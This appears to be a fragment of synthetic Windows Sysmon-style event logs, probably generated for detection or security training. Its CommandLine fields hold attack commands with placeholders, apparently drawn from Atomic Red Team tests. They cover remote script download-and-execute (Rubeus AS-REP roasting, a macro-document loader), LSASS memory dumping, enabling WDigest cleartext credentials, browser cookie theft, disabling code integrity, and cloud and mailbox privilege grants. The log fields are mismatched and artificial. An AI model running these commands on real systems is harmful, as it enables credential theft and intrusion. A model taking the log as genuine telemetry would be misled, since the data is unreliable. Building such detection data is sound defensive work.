        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-14.miller.com",
        "User": "gracenorman",
        "ProcessID": 6315,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"# creating a custom nslookup function that will indeed call nslookup but forces the result to be \\\"whoami\\\"\\n# this would not be part of a real attack but helpful for this simulation\\nfunction nslookup  { &\\\"$env:windir\\\\system32\\\\nslookup.exe\\\" @args | Out-Null; @(\\\"\\\",\\\"whoami\\\")}\\npowershell .(nslookup -q=txt example.com 8.8.8.8)[-1]\\n\",",
        "LogonID": 715073,
        "LogonGuid": "92f58c76-8d24-4e0f-87ee-13fbdd7ae915",
        "SourceProcessID": 7631,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\give..exe",
        "DestinationProcessID": 6802,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\force..dll",
        "UtcTime": "2024-05-17T01:36:51.810491Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-20.west.com",
        "User": "vsimpson",
        "ProcessID": 3041,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"reg query \\\"HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Internet Explorer\\\" /v svcVersion\\n\",",
        "LogonID": 695409,
        "LogonGuid": "f3f3baf4-9fb7-435b-8097-1ca87224aafa",
        "SourceProcessID": 1264,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\method..exe",
        "DestinationProcessID": 2066,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\answer..exe",
        "UtcTime": "2024-05-17T01:36:51.810491Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-24.rodriguez-snyder.org",
        "User": "james52",
        "ProcessID": 8296,
        "ProcessName": "nc.exe",
        "CommandLine": "\"Set-ItemProperty -Force -Path  'HKLM:\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SecurityProviders\\\\WDigest' -Name  'UseLogonCredential' -Value '1' -ErrorAction Ignore\\n\",",
        "LogonID": 890289,
        "LogonGuid": "add4661b-f178-4d15-a6e1-dee053a0379b",
        "SourceProcessID": 6215,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\determine..exe",
        "DestinationProcessID": 1595,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\get..dll",
        "UtcTime": "2024-05-17T01:36:51.810491Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-97.bruce.info",
        "User": "oramsey",
        "ProcessID": 6243,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"Import-Module ExchangeOnlineManagement\\n$secure_pwd = \\\"#{password}\\\" | ConvertTo-SecureString -AsPlainText -Force\\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \\\"#{username}\\\", $secure_pwd\\nConnect-ExchangeOnline -Credential $creds\\nAdd-MailboxPermission -Identity \\\"#{delegate_target}\\\" -User \\\"#{operator_mailbox}\\\" -AccessRights FullAccess -InheritanceType All\\nDisconnect-ExchangeOnline -Confirm:$false\\n\",",
        "LogonID": 717733,
        "LogonGuid": "0e7e5aca-b860-41b5-80a8-a7128aac606a",
        "SourceProcessID": 3930,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\return..exe",
        "DestinationProcessID": 1706,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\dark..dll",
        "UtcTime": "2024-05-17T01:36:51.810491Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-12.barron.org",
        "User": "joeljackson",
        "ProcessID": 3095,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"mavinject $pid /INJECTRUNNING \\\"#{file_name}\\\"\\nInvoke-WebRequest #{server_name} -UseBasicParsing\\n\",",
        "LogonID": 323097,
        "LogonGuid": "f0f07b4a-7b3c-4a08-a95c-9b5860b24d0e",
        "SourceProcessID": 8781,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\outside..dll",
        "DestinationProcessID": 5572,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\produce..dll",
        "UtcTime": "2024-05-17T01:36:51.810491Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-61.west.org",
        "User": "dalton70",
        "ProcessID": 1975,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"\\\"#{venv_path}\\\\Scripts\\\\pypykatz\\\" live lsa \\n\",",
        "LogonID": 746677,
        "LogonGuid": "70aba9c6-dd21-4a23-80df-30de27c65825",
        "SourceProcessID": 2933,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\care..dll",
        "DestinationProcessID": 8020,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\improve..dll",
        "UtcTime": "2024-05-17T01:36:51.810491Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-61.smith-king.biz",
        "User": "craigalexander",
        "ProcessID": 6443,
        "ProcessName": "malware.exe",
        "CommandLine": "\"Import-Module -Name Az.Resources\\n$PWord = ConvertTo-SecureString -String \\\"#{password}\\\" -AsPlainText -Force\\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \\\"#{username}\\\", $Pword\\nConnect-AzAccount -Credential $Credential\\n\\n$sp = Get-AzADServicePrincipal | where-object {$_.DisplayName -eq \\\"#{service_principal_name}\\\"}\\nif ($sp -eq $null) { Write-Warning \\\"Service Principal not found\\\"; exit }\\n$subscription = Get-AzSubscription | where-object {$_.Name -eq \\\"#{subscription}\\\"} \\nif ($subscription -eq $null) { Write-Warning \\\"Subscription not found\\\"; exit }\\n$role = Get-AzRoleDefinition | where-object {$_.Name -eq \\\"#{role_name}\\\"}\\nif ($role -eq $null) { Write-Warning \\\"Role not found\\\"; exit }\\n\\nNew-AzRoleAssignment -ObjectId $sp.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription\\nWrite-Host \\\"Service Principal $($sp.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)\\\"\\n\",",
        "LogonID": 106342,
        "LogonGuid": "5fdb29a7-8437-4229-8d86-8bd0cd1cea67",
        "SourceProcessID": 9477,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\take..dll",
        "DestinationProcessID": 5248,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\some..exe",
        "UtcTime": "2024-05-17T01:36:51.811995Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-69.miller.info",
        "User": "jeremy22",
        "ProcessID": 7311,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"docker build -t t1612  $PathtoAtomicsFolder/T1612/src/\\ndocker run --name t1612_container  -d -t t1612\\ndocker exec t1612_container ./test.sh\",",
        "LogonID": 987777,
        "LogonGuid": "86be0874-4ac3-469a-97ee-912d43b3a238",
        "SourceProcessID": 2026,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\task..dll",
        "DestinationProcessID": 2039,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\parent..dll",
        "UtcTime": "2024-05-17T01:36:51.811995Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-33.collins-rowland.com",
        "User": "heather02",
        "ProcessID": 6197,
        "ProcessName": "malware.exe",
        "CommandLine": "\"Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }\\n\",",
        "LogonID": 713350,
        "LogonGuid": "3e1bf32a-b913-4df9-8365-67e172ad054b",
        "SourceProcessID": 6128,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\pretty..exe",
        "DestinationProcessID": 1697,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\north..dll",
        "UtcTime": "2024-05-17T01:36:51.811995Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "db-13.rivers-harrell.com",
        "User": "alexandrapark",
        "ProcessID": 1382,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"reg query HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Nls\\\\Language\\n\",",
        "LogonID": 687283,
        "LogonGuid": "07a96a26-e78d-49da-9995-37b0350abfd3",
        "SourceProcessID": 2699,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\performance..dll",
        "DestinationProcessID": 3585,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\local..exe",
        "UtcTime": "2024-05-17T01:36:51.811995Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-98.richardson.info",
        "User": "jacobsanchez",
        "ProcessID": 9128,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"aws iam create-user --user-name #{username}\\n\",",
        "LogonID": 378457,
        "LogonGuid": "8f5272d3-9381-4c70-b471-18f023a421d0",
        "SourceProcessID": 6475,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\lead..exe",
        "DestinationProcessID": 2701,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\after..dll",
        "UtcTime": "2024-05-17T01:36:51.811995Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "desktop-98.taylor-rhodes.com",
        "User": "aaron41",
        "ProcessID": 7571,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')\\nInvoke-Rubeus -Command \\\"asreproast /format:hashcat /nowrap\\\"\",",
        "LogonID": 903040,
        "LogonGuid": "9f151698-b994-4e28-afae-2b7f48e3f1a5",
        "SourceProcessID": 7087,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\including..dll",
        "DestinationProcessID": 6986,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\try..dll",
        "UtcTime": "2024-05-17T01:36:51.811995Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-43.gutierrez.org",
        "User": "tracysummers",
        "ProcessID": 1537,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"stop-process -name \\\"chrome\\\" -force -erroraction silentlycontinue\\n\\\"select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];\\\" | cmd /c #{sqlite3_path} \\\"#{cookie_db}\\\" | out-file -filepath \\\"#{output_file}\\\"\\n\",",
        "LogonID": 214535,
        "LogonGuid": "639e9d4b-4fb7-4e69-a702-38bf46ad3dd3",
        "SourceProcessID": 9926,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\message..dll",
        "DestinationProcessID": 3463,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\budget..dll",
        "UtcTime": "2024-05-17T01:36:51.813001Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-23.weiss.net",
        "User": "darrelllee",
        "ProcessID": 3847,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)\\nif($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }\\nC:\\\\Windows\\\\System32\\\\rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll, MiniDump $id $env:TEMP\\\\svchost-exe.dmp full\\n\",",
        "LogonID": 421369,
        "LogonGuid": "a6828140-cf29-42b7-9d68-d112fc938f66",
        "SourceProcessID": 5884,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\black..exe",
        "DestinationProcessID": 8391,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\true..dll",
        "UtcTime": "2024-05-17T01:36:51.813001Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-07.cervantes-huang.info",
        "User": "egrant",
        "ProcessID": 6340,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine\\n\",",
        "LogonID": 441419,
        "LogonGuid": "d6f57c34-1a47-4e3b-8df2-8256aa364c72",
        "SourceProcessID": 7657,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\continue..exe",
        "DestinationProcessID": 5812,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\student..dll",
        "UtcTime": "2024-05-17T01:36:51.813001Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-16.rodriguez.com",
        "User": "douglas59",
        "ProcessID": 4548,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"echo T1486 - Purelocker Ransom Note > %USERPROFILE%\\\\Desktop\\\\YOUR_FILES.txt\\n\",",
        "LogonID": 815409,
        "LogonGuid": "eebf9ed4-2edb-4476-85cf-cc7818af98d1",
        "SourceProcessID": 2381,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\dog..exe",
        "DestinationProcessID": 2271,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\stock..dll",
        "UtcTime": "2024-05-17T01:36:51.813001Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-89.ramos.com",
        "User": "williamjones",
        "ProcessID": 8859,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"reg add \\\"HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\DeviceGuard\\\\Scenarios\\\\HypervisorEnforcedCodeIntegrity\\\" /v \\\"Enabled\\\" /t REG_DWORD /d 0 /f\\n\",",
        "LogonID": 794468,
        "LogonGuid": "e242d328-da35-4083-aca0-dd3827607c21",
        "SourceProcessID": 9853,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\skill..exe",
        "DestinationProcessID": 2865,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\PM..dll",
        "UtcTime": "2024-05-17T01:36:51.813001Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-31.carpenter.info",
        "User": "brownamy",
        "ProcessID": 3648,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"New-Item -Path #{teamviewer_log_file} -Force | Out-Null\\nRemove-Item #{teamviewer_log_file} -Force -ErrorAction Ignore\\n\",",
        "LogonID": 100953,
        "LogonGuid": "f424eb2b-32a1-446d-b43e-4ab96e02ec09",
        "SourceProcessID": 6575,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\rich..exe",
        "DestinationProcessID": 7861,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\arm..exe",
        "UtcTime": "2024-05-17T01:36:51.814000Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-26.gonzalez.com",
        "User": "mbaldwin",
        "ProcessID": 4958,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"forfiles /p c:\\\\windows\\\\system32 /m notepad.exe /c #{process}\\n\",",
        "LogonID": 707318,
        "LogonGuid": "58cc0f5b-a58e-4fe5-aa7d-67d0276c51c2",
        "SourceProcessID": 4702,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\language..dll",
        "DestinationProcessID": 4697,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\west..exe",
        "UtcTime": "2024-05-17T01:36:51.814000Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-00.sullivan.info",
        "User": "marcus53",
        "ProcessID": 3994,
        "ProcessName": "nc.exe",
        "CommandLine": "\"Get-adcomputer -SearchScope subtree -filter \\\"name -like '*'\\\" -Properties *\",",
        "LogonID": 237701,
        "LogonGuid": "5578f9df-757e-4de3-8f36-c9aafc14f85b",
        "SourceProcessID": 6145,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\item..exe",
        "DestinationProcessID": 5544,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\fish..exe",
        "UtcTime": "2024-05-17T01:36:51.814000Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-90.chase.net",
        "User": "anthonymichael",
        "ProcessID": 6081,
        "ProcessName": "malware.exe",
        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nIEX (iwr \\\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\\\" -UseBasicParsing)\\nInvoke-Maldoc -macroFile \\\"PathToAtomicsFolder\\\\T1070.001\\\\src\\\\T1070.001-macrocode.txt\\\" -officeProduct \\\"Word\\\" -sub \\\"ClearLogs\\\"\\n\",",
        "LogonID": 878924,
        "LogonGuid": "57070c0b-fe3b-4929-9d6c-d893328fae0d",
        "SourceProcessID": 7479,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\report..exe",
        "DestinationProcessID": 3272,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\partner..dll",
        "UtcTime": "2024-05-17T01:36:51.814000Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-63.johnson.com",
        "User": "wallssamuel",
        "ProcessID": 1214,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"Get-AdGroup -Filter *\\n\",",
        "LogonID": 444556,
        "LogonGuid": "4dea313c-7d7c-4d27-814d-428c262e3bd4",
        "SourceProcessID": 8869,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\start..exe",
        "DestinationProcessID": 4940,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\trip..exe",
        "UtcTime": "2024-05-17T01:36:51.814000Z"
    },
